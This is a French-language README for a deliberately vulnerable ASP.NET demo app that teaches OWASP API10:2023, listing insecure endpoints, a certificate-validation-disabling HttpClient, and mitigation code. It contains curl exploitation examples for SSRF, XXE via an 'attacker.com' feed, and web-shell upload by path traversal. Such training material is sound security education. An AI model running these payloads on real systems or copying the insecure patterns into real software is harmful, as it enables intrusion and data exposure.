# API10:2023 - Unsafe Consumption of APIs

## ?? Description de la vuln�rabilit�

La vuln�rabilit� **API10:2023 - Unsafe Consumption of APIs** se produit lorsqu'une application consomme des APIs tierces sans appliquer les contr�les de s�curit� appropri�s. Les d�veloppeurs ont tendance � faire davantage confiance aux donn�es provenant d'APIs tierces qu'aux entr�es utilisateur, ce qui cr�e des opportunit�s d'exploitation.

### Risques principaux :
- **Injection de donn�es malveillantes** via des APIs compromises
- **Exposition de donn�es sensibles** aux services tiers non fiables
- **Ex�cution de code arbitraire** via des r�ponses non valid�es
- **Attaques Man-in-the-Middle** par absence de validation SSL/TLS
- **D�ni de service** par consommation excessive de ressources

## ?? Controller : Api10UnsafeConsumptionController

Ce controller d�montre intentionnellement plusieurs sc�narios vuln�rables de consommation non s�curis�e d'APIs tierces.

## ?? Sc�narios vuln�rables impl�ment�s

### 1. **Weather API** - Injection de contenu non valid�
```
GET /api/external/weather/{location}
```
**Vuln�rabilit�s :**
- Injection possible dans l'URL via le param�tre `location`
- D�s�rialisation directe sans validation du contenu JSON
- Pas de timeout d�fini pour les requ�tes
- Exposition de la r�ponse compl�te de l'API externe
- D�tails d'erreur expos�s (stack trace)

### 2. **Payment Processing** - Trust aveugle des donn�es
```
POST /api/external/payment/process
```
**Vuln�rabilit�s :**
- Utilisation de HTTP au lieu de HTTPS
- Logging des donn�es de carte bancaire en clair
- Trust aveugle de la r�ponse du processeur de paiement
- Stockage des donn�es sensibles dans la base
- Inclusion de m�tadonn�es non valid�es

### 3. **User Verification** - Exposition de donn�es sensibles
```
POST /api/external/verify/user
```
**Vuln�rabilit�s :**
- Envoi du SSN (Social Security Number) en clair
- D�sactivation de la validation SSL/TLS
- Utilisation d'endpoints non s�curis�s par d�faut
- Parse direct de la r�ponse sans validation
- Pas de limite de taille sur la r�ponse (DoS possible)

### 4. **Proxy Request** - Redirection non contr�l�e (SSRF)
```
POST /api/external/proxy
```
**Vuln�rabilit�s :**
- Permet de proxy vers n'importe quelle URL (SSRF)
- Copie tous les headers sans validation
- Suit automatiquement les redirections
- Expose l'URL finale apr�s redirections
- Retourne les d�tails complets des exceptions

### 5. **RSS Aggregation** - Parsing XML non s�curis�
```
POST /api/external/rss/aggregate
```
**Vuln�rabilit�s :**
- XXE (XML External Entity) injection possible
- R�solution d'URL externes activ�e
- Ex�cution de contenu HTML si demand�
- Contenu HTML non sanitis� retourn�
- Continue le traitement malgr� les erreurs

### 6. **Webhook Reception** - Ex�cution non valid�e
```
POST /api/external/webhook/receive
```
**Vuln�rabilit�s :**
- Absence de validation de signature
- Ex�cution d'actions bas�es sur payload non valid�
- Cr�ation d'utilisateurs avec donn�es non v�rifi�es
- Ex�cution de commandes arbitraires
- Retour des donn�es brutes du webhook

### 7. **API Aggregation** - Parall�lisation non s�curis�e
```
POST /api/external/aggregate
```
**Vuln�rabilit�s :**
- Ex�cution parall�le sans limite (DoS possible)
- Ajout de tous les headers fournis sans validation
- Pas de timeout global
- Parse de n'importe quel type de contenu
- Retour du contenu brut en cas d'erreur

### 8. **Social Media Posting** - Int�gration non s�curis�e
```
POST /api/external/social/post
```
**Vuln�rabilit�s :**
- Utilisation d'endpoints non v�rifi�s
- Cl�s API hardcod�es dans le code
- Utilisation de HTTP au lieu de HTTPS
- Retour de la r�ponse brute des plateformes
- Pas de validation des plateformes

### 9. **File Upload** - Transfert non s�curis�
```
POST /api/external/file/upload
```
**Vuln�rabilit�s :**
- Pas de validation de la taille du fichier
- Pas de validation du type de fichier
- Utilisation directe du nom de fichier client (Path Traversal)
- Accepte tous types d'extensions (.exe, .dll, etc.)
- Trust du Content-Type original
- Fichiers accessibles publiquement
- Exposition du chemin r�el du serveur

## ?? Points d'entr�e � risque

### Configuration HttpClient vuln�rable :
```csharp
private static readonly HttpClient _unsafeClient = new HttpClient(new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true,
    AllowAutoRedirect = true,
    MaxAutomaticRedirections = 10
});
```

### Points critiques :
- **Validation SSL d�sactiv�e** : Permet les attaques MitM
- **Redirections automatiques** : Peut conduire � des endpoints malveillants
- **Pas de timeout** : Vuln�rable aux attaques DoS
- **Pas de limite de taille** : �puisement m�moire possible

## ?? Exemples d'exploitation

### 1. Injection via Weather API
```bash
# Injection de caract�res sp�ciaux dans l'URL
curl -X GET "http://localhost:5000/api/external/weather/Paris%27%20OR%201=1--"
```

### 2. SSRF via Proxy
```bash
# Acc�s aux services internes
curl -X POST "http://localhost:5000/api/external/proxy" \
  -H "Content-Type: application/json" \
  -d '{
    "targetUrl": "http://localhost:6379/",
    "method": "GET"
  }'
```

### 3. XXE via RSS
```bash
# Injection XXE pour lire des fichiers locaux
curl -X POST "http://localhost:5000/api/external/rss/aggregate" \
  -H "Content-Type: application/json" \
  -d '{
    "feedUrls": ["http://attacker.com/malicious-rss.xml"],
    "parseHtml": true
  }'
```

### 4. Path Traversal via File Upload
```bash
# Upload avec nom de fichier malveillant
curl -X POST "http://localhost:5000/api/external/file/upload" \
  -F "file=@malicious.aspx;filename=../../../wwwroot/shell.aspx"
```

## ??? M�thodes de mitigation recommand�es

### 1. **Validation SSL/TLS stricte**
```csharp
// Configuration s�curis�e
var handler = new HttpClientHandler
{
    // Laisser la validation SSL par d�faut (activ�e)
    ServerCertificateCustomValidationCallback = null
};
```

### 2. **Liste blanche des URLs**
```csharp
private bool IsUrlAllowed(string url)
{
    var allowedHosts = new[] { "api.trusted.com", "storage.mycompany.com" };
    
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
        return false;
    
    if (uri.Scheme != "https")
        return false;
    
    if (!allowedHosts.Contains(uri.Host))
        return false;
    
    return true;
}
```

### 3. **Configuration de timeouts**
```csharp
using var client = new HttpClient()
{
    Timeout = TimeSpan.FromSeconds(30)
};
```

### 4. **Limitation de taille des r�ponses**
```csharp
client.MaxResponseContentBufferSize = 10 * 1024 * 1024; // 10 MB max

if (response.Content.Headers.ContentLength > 10 * 1024 * 1024)
{
    throw new InvalidOperationException("R�ponse trop grande");
}
```

### 5. **Validation des donn�es re�ues**
```csharp
// Utiliser des DTOs avec validation
[Required]
[MaxLength(100)]
public string Location { get; set; }

// Valider avant d�s�rialisation
var options = new JsonSerializerOptions
{
    MaxDepth = 32,
    PropertyNameCaseInsensitive = false
};
```

### 6. **Configuration XML s�curis�e**
```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null,
    MaxCharactersFromEntities = 1024
};
```

### 7. **Validation des webhooks**
```csharp
// V�rifier la signature HMAC
private bool ValidateWebhookSignature(string payload, string signature)
{
    var secret = _configuration["WebhookSecret"];
    using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(secret));
    var computedHash = hmac.ComputeHash(Encoding.UTF8.GetBytes(payload));
    var computedSignature = Convert.ToBase64String(computedHash);
    return signature == computedSignature;
}
```

### 8. **Validation des fichiers upload�s**
```csharp
// Validation du nom de fichier
var fileName = Path.GetFileName(file.FileName);
fileName = Path.GetRandomFileName() + Path.GetExtension(fileName);

// Validation de l'extension
var allowedExtensions = new[] { ".jpg", ".png", ".pdf" };
if (!allowedExtensions.Contains(Path.GetExtension(fileName)))
    throw new InvalidOperationException("Type de fichier non autoris�");

// Validation de la taille
if (file.Length > 10 * 1024 * 1024) // 10 MB
    throw new InvalidOperationException("Fichier trop volumineux");
```

## ?? Tests et d�monstrations

### Tests de s�curit� recommand�s :

1. **Test de validation SSL** : Tentez de vous connecter � des endpoints avec certificats invalides
2. **Test SSRF** : Essayez d'acc�der aux services internes via le proxy
3. **Test XXE** : Injectez des entit�s externes dans les flux RSS
4. **Test de timeout** : Envoyez des requ�tes vers des endpoints lents
5. **Test de taille** : Tentez de recevoir des r�ponses tr�s volumineuses
6. **Test d'injection** : Injectez des payloads malveillants dans les param�tres
7. **Test de path traversal** : Utilisez des noms de fichiers avec ../
8. **Test de webhook** : Envoyez des webhooks sans signature valide

## ?? R�f�rences OWASP

- [OWASP API Security Top 10 2023 - API10:2023](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## ?? AVERTISSEMENT

**CE CODE CONTIENT INTENTIONNELLEMENT DES VULN�RABILIT�S � DES FINS �DUCATIVES.**

**NE JAMAIS UTILISER CE CODE EN PRODUCTION !**

Ce controller fait partie d'une application de d�monstration pour l'apprentissage de la s�curit� des APIs. Il illustre les mauvaises pratiques � �viter lors de la consommation d'APIs tierces.